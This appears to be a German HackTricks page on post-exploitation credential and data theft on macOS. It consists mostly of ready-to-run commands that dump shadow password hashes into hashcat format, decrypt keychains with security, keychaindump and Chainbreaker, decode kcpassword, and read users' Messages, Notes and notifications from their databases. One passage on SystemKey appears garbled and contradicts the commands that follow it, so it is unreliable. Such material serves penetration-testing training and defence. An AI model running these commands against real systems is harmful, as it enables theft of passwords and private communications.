# macOS Sensible Orte

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Passwörter

### Shadow-Passwörter

Das Shadow-Passwort wird zusammen mit der Benutzerkonfiguration in plists gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\
Der folgende Oneliner kann verwendet werden, um **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) abzurufen:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in **hashcat-Format** zu transformieren.

Eine alternative Einzeiler-Anweisung, die die Anmeldeinformationen aller Nicht-Service-Konten im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Keychain-Dump

Beachten Sie, dass bei der Verwendung des Sicherheits-Binärs zum **Dumpen der entschlüsselten Passwörter** mehrere Aufforderungen den Benutzer dazu auffordern, diese Operation zu erlauben.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Basierend auf diesem Kommentar [juuso/keychaindump#10 (Kommentar)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) scheint es, dass diese Tools in Big Sur nicht mehr funktionieren.
{% endhint %}

### Übersicht über Keychaindump

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Schlüsselbunden zu extrahieren, aber es stößt auf Einschränkungen in neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angegeben. Die Verwendung von **keychaindump** erfordert, dass der Angreifer Zugriff erhält und Privilegien auf **root** eskaliert. Das Tool nutzt die Tatsache aus, dass der Schlüsselbund standardmäßig beim Benutzerlogin aus Bequemlichkeit entsperrt wird, sodass Anwendungen darauf zugreifen können, ohne das Passwort des Benutzers wiederholt anzufordern. Wenn ein Benutzer jedoch seinen Schlüsselbund nach jeder Verwendung sperrt, wird **keychaindump** unwirksam.

**Keychaindump** arbeitet, indem es einen bestimmten Prozess namens **securityd** ins Visier nimmt, der von Apple als Daemon für Autorisierungs- und kryptografische Operationen beschrieben wird und für den Zugriff auf den Schlüsselbund unerlässlich ist. Der Extraktionsprozess beinhaltet die Identifizierung eines **Master Key**, der aus dem Anmeldepasswort des Benutzers abgeleitet wird. Dieser Schlüssel ist entscheidend für das Lesen der Schlüsselbunddatei. Um den **Master Key** zu finden, durchsucht **keychaindump** den Speicher-Heap von **securityd**, indem es den Befehl `vmmap` verwendet und nach potenziellen Schlüsseln in Bereichen sucht, die als `MALLOC_TINY` gekennzeichnet sind. Der folgende Befehl wird verwendet, um diese Speicherorte zu inspizieren:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nachdem potenzielle Master-Schlüssel identifiziert wurden, durchsucht **keychaindump** die Heaps nach einem spezifischen Muster (`0x0000000000000018`), das auf einen Kandidaten für den Master-Schlüssel hinweist. Weitere Schritte, einschließlich der Entschleierung, sind erforderlich, um diesen Schlüssel zu nutzen, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zur Entschlüsselung des Schlüsselbunds im Speicher des **securityd**-Prozesses gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** lautet:
```bash
sudo ./keychaindump
```
### Chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um folgende Arten von Informationen aus einem OSX-Schlüsselbund auf forensisch sichere Weise zu extrahieren:

* Gehashtes Schlüsselbund-Passwort, geeignet zum Knacken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
* Internet-Passwörter
* Generische Passwörter
* Private Schlüssel
* Öffentliche Schlüssel
* X509-Zertifikate
* Sichere Notizen
* Appleshare-Passwörter

Mit dem Schlüsselbund-Entsperrpasswort, einem mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erhaltenen Master-Schlüssel oder einer Entsperrdatei wie SystemKey kann Chainbreaker auch Klartext-Passwörter bereitstellen.

Ohne eine dieser Methoden zum Entsperren des Schlüsselbunds zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Schlüsselbund-Schlüssel dumpen**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump Keychain-Schlüssel (mit Passwörtern) mit SystemKey**

SystemKey ist ein Tool, das auf macOS verwendet werden kann, um Keychain-Schlüssel mit Passwörtern abzurufen. Es kann verwendet werden, um sensible Informationen wie Benutzernamen und Passwörter aus dem Keychain zu extrahieren.

Um SystemKey zu verwenden, müssen Sie über Administratorrechte auf dem macOS-System verfügen. Führen Sie den folgenden Befehl aus, um die Keychain-Schlüssel mit Passwörtern abzurufen:

```bash
/System/Library/Security/SecurityAgentPlugins/SystemKeychain.bundle/Contents/Resources/./systemkeychain -dump
```

Dieser Befehl gibt alle Keychain-Schlüssel mit ihren zugehörigen Passwörtern aus. Beachten Sie jedoch, dass dies sensible Informationen enthüllen kann und daher mit Vorsicht verwendet werden sollte.

Es ist wichtig zu beachten, dass SystemKey ein legitimes Tool ist, das von Apple bereitgestellt wird. Es wird normalerweise für administrative Zwecke verwendet, kann jedoch auch von Angreifern missbraucht werden, um unbefugten Zugriff auf gespeicherte Passwörter zu erlangen. Daher sollten Sie sicherstellen, dass Sie über die erforderlichen Berechtigungen verfügen und das Tool verantwortungsbewusst verwenden.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump Keychain-Schlüssel (mit Passwörtern) durch Knacken des Hashs**

Um die Keychain-Schlüssel mit den dazugehörigen Passwörtern zu extrahieren, können wir den Hash des Keychain-Schlüssels knacken.
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpen Sie Schlüsselbundschlüssel (mit Passwörtern) mit Speicherauszug**

[Befolgen Sie diese Schritte](..#speicherauszug-mit-osxpmem-durchführen), um einen **Speicherauszug** durchzuführen.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpen Sie Schlüsselbundschlüssel (mit Passwörtern) unter Verwendung des Benutzerpassworts**

Wenn Sie das Passwort des Benutzers kennen, können Sie es verwenden, um **Schlüsselbünde des Benutzers zu dumpen und zu entschlüsseln**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Die Datei **kcpassword** ist eine Datei, die das **Anmeldepasswort des Benutzers** enthält, jedoch nur, wenn der Systembesitzer die **automatische Anmeldung aktiviert** hat. Dadurch wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** xor-verknüpft. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel wieder verwendet.\
Dies macht das Passwort ziemlich einfach wiederherstellbar, zum Beispiel mit Skripten wie [**diesem**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Nachrichten
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Benachrichtigungen

Sie können die Benachrichtigungsdaten in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` finden.

Die meisten interessanten Informationen befinden sich in **blob**. Sie müssen also diesen Inhalt **extrahieren** und in ein **lesbares** Format **umwandeln** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Notizen

Die **Notizen** der Benutzer können in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` gefunden werden.

{% endcode %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
